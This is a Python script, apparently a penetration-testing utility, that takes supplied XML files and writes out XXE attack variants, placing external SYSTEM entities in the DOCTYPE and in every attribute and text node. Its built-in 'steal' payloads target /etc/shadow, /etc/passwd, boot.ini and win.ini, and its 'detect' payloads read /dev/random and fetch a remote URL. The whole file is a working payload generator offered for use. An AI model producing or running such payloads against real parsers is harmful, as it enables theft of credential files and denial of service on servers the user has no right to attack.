# -*- coding: utf-8 -*-
from xml.sax.saxutils import unescape
from lxml import etree
from optparse import OptionParser
import os

__author__ = 'max'


def parse_options():
    """Parse command line arguments."""

    opt_parser = OptionParser()
    opt_parser.add_option('-f', '--file', '--files', dest='files',
                          help='Path to an XML file. Multiple files supported'
                               '(each with its own option prefix)', action='append')
    opt_parser.add_option('-e', '--entity', '--entities', dest='entities', action='append',
                          help='Custom entity body(optional). '
                               'Multiple entities supported(each with its own option prefix)')
    opt_parser.add_option('-n', '--file-per-node', dest='file_per_node',
                          help='Only one payload to be contained in a generated'
                               ' file(payload per attribute/node).',
                          action='store_false', default=True)
    opt_parser.add_option('-d', '--dtd', dest='dtd', action='store_true', default=False,
                          help='Use this flag to turn on DTD generation.')
    opt_parser.add_option('-s', '--simple-header', dest='simple_header',
                          action='store_true', default=False,
                          help='simple_header - if the flag is up,'
                               ' output files headers won\'t contain '
                               'encoding attribute')
    opt_parser.add_option('-m', '--modes', dest='modes', action='append',
                          help='Type of payload to be generated. Available modes:'
                               'S - stealing, D - detection, U - User provided')
    opt_parser.add_option('-l', '--line-per-payload', dest='single_file_line_per_payload', action='store_true',
                          default=False, help='If this flag is up,'
                                              ' there will be a single output file, which contains '
                                              'ONE payload per LINE.')

    return opt_parser.parse_args()[0]


def validate_options(options):
    """Validate given options."""

    if options.files is None or len(options.files) <= 0:
        raise Exception("No XML files provided. Run the script with '-h' for help")

    existing_files = list(set(
        [filename for filename in options.files
         if os.path.exists(filename) and os.path.isfile(filename)]))

    if len(existing_files) <= 0:
        raise Exception("No XML files provided. Run the script with '-h' for help.\n\t\t"
                        "Probably, none of given files is present.")

    options.files = existing_files

    available_modes = ('S', 'D')
    active_modes = []
    if options.modes is not None:
        active_modes = list(set(
            [mode for mode in options.modes
             if mode in available_modes]
        ))

    # If no modes set, put all available modes on
    options.modes = active_modes if len(active_modes) > 0 else available_modes

    return options


def append_payloads(options):
    """Append payloads of needed types to the options."""

    payloads = {
        'D': [  # detect
                'file:///dev/random',
                'http://codepad.org/kfHNgnZj/raw.c',
                ],
        'S': [  # steal
                'file:///etc/shadow',
                'file:///etc/passwd',
                'file:///c:/boot.ini',
                'file:///c:/winnt/win.ini',
                ]}

    if options.entities is not None and len(options.entities) > 0:
        payloads['U'] = options.entities
        options.modes = tuple(list(options.modes) + ['U'])

    options.payloads = {}

    for mode in options.modes:
        options.payloads[mode] = payloads[mode]

    return options


def build_trees_and_dtds(options):
    """Builds trees(and DTD's if needed) in the form
    of pairs of the following structure: (tree, dtd_of_the_tree),
    and appends it to the options as 'trees_and_dtds' field."""

    def build_dtd(tree):
        """Returns a DTD description of a given tree in a form of a string."""

        element_template = '<!ELEMENT %s ANY>'
        attlist_template = '<!ATTLIST %s %s CDATA #REQUIRED>'

        dtd_elements = set()

        for elem in tree.iter():
            dtd_elements.add(element_template % elem.tag)

            for attr_name in elem.attrib.keys():
                dtd_elements.add(attlist_template % (elem.tag, attr_name))

        return '\n\t'.join(dtd_elements)

    options.trees_and_dtds = [(lambda a: (a, build_dtd(a) if options.dtd else ''))(etree.parse(filename)) for filename
                              in options.files]

    return options


def build_entity(name, value):
    """Returns a single formed entity in a form of a string."""
    entity_template = '<!ENTITY %s SYSTEM "%s">'
    return entity_template % (name, value)


def build_entities(values, static_tag=None):
    """Returns a list of entities in a form of a string.
    If static_prefix argument is passed, it will be used to
    form entities."""
    entity_prefix = 'a'
    return '\n\t'.join([build_entity(entity_prefix + str(i)
                                     if static_tag is None else static_tag,
                                     value) for i, value in enumerate(values)])


def build_entity_payload(entity_prefix, count=1):
    """Returns entity payload with given prefix."""
    entity_payload_template = '&%s;'
    return ''.join([entity_payload_template % (entity_prefix + str(i)
                                               if count > 1 else entity_prefix)
                    for i in range(0, count)])


def build_doctype_payload(payload_prefix, count=1):
    """Returns payload with given prefix."""
    payload_template = '%s;'
    return ''.join(['%' + (payload_template % (payload_prefix + str(i)
                                               if count > 1 else payload_prefix))
                    for i in range(0, count)])


def build_doctype(root_tag, dtd, entities, doctype_payload):
    """Returns a formed DOCTYPE element; made on the basis of
    DOCTYPE_TEMPLATE and consists of the name of the document
    root tag, DTD of the given XML and given entities
    description(string)."""
    doctype_template = '<!DOCTYPE %s [ %s\n%s %s ]>'  # root_node_tag, dtd, entities
    return doctype_template % (root_tag, dtd, '\t' + entities, doctype_payload)


def save_output_file(filename, tree, doctype, simple_xml_declaration=True):
    simple_xml_declaration_header = '<?xml version="1.0"?>\n'
    result = unescape(
        etree.tostring(tree, xml_declaration=not simple_xml_declaration,
                       encoding=tree.docinfo.encoding,
                       doctype=doctype,
                       pretty_print=True).decode(tree.docinfo.encoding))
    print('Working on file: %s; xxe bomb filename: %s' % (tree.getroot().base, filename))
    open(filename, 'w').write(simple_xml_declaration_header + result
                              if simple_xml_declaration else
                              result)


def build_bomb_payload_per_node(options):
    """Builds XML-bombs; each bomb is about to contain entity
    in a single node or attribute."""

    if not options.file_per_node:
        return options

    single_file_payloads = []  # needed if options.single_file_line_per_payload is True

    total_files = 0  # number of generated files
    p = 0  # payloads counter

    for mode, payloads in options.payloads.items():
        for tree, dtd in options.trees_and_dtds:
            for payload in payloads:
                doctype_payload_set = False  # if we already crafted a doctype-placed payload
                i = 0  # insertions counter

                filename_prefix = os.path.basename(tree.getroot().base).split('.')[0]

                if not doctype_payload_set:
                    doctype_payload_content = build_doctype_payload(mode)
                    doctype = build_doctype(tree.getroot().tag, dtd, build_entities([payload], '% ' + mode),
                                            doctype_payload_content)

                    if not options.single_file_line_per_payload:
                        final_filename = '%s_%s_%d_%d.xml' % (filename_prefix, mode, p, i)
                        save_output_file(final_filename, tree, doctype, options.simple_header)
                    else:
                        simple_xml_declaration_header = '<?xml version="1.0"?>\n'
                        result = unescape(
                            etree.tostring(tree, xml_declaration=not options.simple_header,
                                           encoding=tree.docinfo.encoding,
                                           doctype=doctype,
                                           pretty_print=True).decode(tree.docinfo.encoding))
                        pld = (simple_xml_declaration_header + result
                               if options.simple_header else
                               result).replace('\n', ' ')
                        single_file_payloads.append(pld)

                    doctype_payload_set = True  # no needed anymore for current tree
                    i += 1

                doctype = build_doctype(tree.getroot().tag, dtd, build_entities([payload], mode), '')

                for elem in tree.iter():
                    for attr_name in elem.attrib.keys():
                        buf = elem.attrib[attr_name]
                        elem.attrib[attr_name] = build_entity_payload(mode)

                        if not options.single_file_line_per_payload:
                            final_filename = '%s_%s_%d_%d.xml' % (filename_prefix, mode, p, i)
                            save_output_file(final_filename, tree, doctype, options.simple_header)
                        else:
                            simple_xml_declaration_header = '<?xml version="1.0"?>\n'
                            result = unescape(
                                etree.tostring(tree, xml_declaration=not options.simple_header,
                                               encoding=tree.docinfo.encoding,
                                               doctype=doctype,
                                               pretty_print=True).decode(tree.docinfo.encoding))
                            pld = (simple_xml_declaration_header + result
                                   if options.simple_header else
                                   result).replace('\n', ' ')
                            single_file_payloads.append(pld)

                        elem.attrib[attr_name] = buf
                        i += 1

                    buf = elem.text
                    elem.text = build_entity_payload(mode)

                    if not options.single_file_line_per_payload:
                        final_filename = '%s_%s_%d_%d.xml' % (filename_prefix, mode, p, i)
                        save_output_file(final_filename, tree, doctype, options.simple_header)
                    else:
                        simple_xml_declaration_header = '<?xml version="1.0"?>\n'
                        result = unescape(
                            etree.tostring(tree, xml_declaration=not options.simple_header,
                                           encoding=tree.docinfo.encoding,
                                           doctype=doctype,
                                           pretty_print=True).decode(tree.docinfo.encoding))
                        pld = (simple_xml_declaration_header + result
                               if options.simple_header else
                               result).replace('\n', ' ')
                        single_file_payloads.append(pld)

                    elem.text = buf
                    i += 1

                if not options.single_file_line_per_payload:
                    total_files += i

            if options.single_file_line_per_payload:
                total_files += 1
                filename = '%s_all_payloads_file_%d.xml' % (os.path.basename(tree.getroot().base).split('.')[0],
                                                            total_files)
                open(filename, 'w').write('\n'.join(single_file_payloads))

        p += 1

    print('Total number of generated files: %d' % total_files)

    return options


def build_bomb_put_payload_everywhere(options):
    """Builds a single XML-bomb, which contains all the
    entities as a payload in every single attribute and node."""

    if not not options.file_per_node:
        return options

    payload_prefix = 'a'

    payloads = [value for key in options.payloads.keys()
                for value in options.payloads[key]]

    payload = build_entity_payload('a', len(payloads))

    doctype = ''

    doctype_payload_set = False

    for tree, dtd in options.trees_and_dtds:
        filename_prefix = os.path.basename(tree.getroot().base).split('.')[0]

        i = 0  # insertions counter

        if not doctype_payload_set:
            doctype_payload_content = build_doctype_payload(payload_prefix)
            doctype = build_doctype(tree.getroot().tag, dtd,
                                    build_entities(payloads) +
                                    '\n\t' + build_entities([payloads[0]], '% ' + payload_prefix),
                                    doctype_payload_content)
            doctype_payload_set = True
            i += 1

        for elem in tree.iter():
            for attr_name in elem.attrib.keys():
                elem.attrib[
                    attr_name] = payload
                i += 1

            elem.text = payload
            i += 1

        final_filename = '%s_%d.xml' % (filename_prefix, i)
        save_output_file(final_filename, tree, doctype)

        print('Total number of insertions: %d; files generated: 1' % i)

    return options


if __name__ == '__main__':
    valid_options = parse_options()
    valid_options = validate_options(valid_options)
    valid_options = append_payloads(valid_options)
    valid_options = build_trees_and_dtds(valid_options)
    valid_options = build_bomb_payload_per_node(valid_options)
    valid_options = build_bomb_put_payload_everywhere(valid_options)